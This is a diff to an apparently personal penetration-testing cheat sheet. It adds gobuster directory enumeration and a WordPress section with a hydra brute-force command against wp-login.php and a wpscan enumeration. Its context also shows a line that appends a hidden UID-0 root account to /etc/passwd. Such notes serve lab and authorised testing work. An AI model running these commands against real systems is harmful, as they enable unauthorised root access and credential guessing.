@@ -7,8 +7,9 @@ sudo nmap -O -sS -p- "$target" | tee synscan.txt && sudo nmap -sC -sV "$target" 
 # Sudo
 sudo -l
 
-# Dirb
+# Web Enumeration (Dirb|gobuster)
 dirb "http://$target" -r -z 10
+gobuster dir -k --url "$target" --wordlist /usr/share/dirb/wordlists/common.txt
 
 # SMB
 sudo nbtscan -r "$target"
@@ -37,3 +38,6 @@ wmic qfe get Caption, Description, HotFixID, InstalledOn **installed version**
 openssl password "$pasword" **generate password hash for $password**
 echo "root2:$hash:0:0:root:/root:/bin/bash" >> /etc/passwd
 
+# WordPress
+hydra -l /usr/share/commix/src/txt/usernames.txt -p /usr/share/seclists/Passwords/cirt-default-passwords.txt "$target" -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+wpscan --url "http://$target" -e
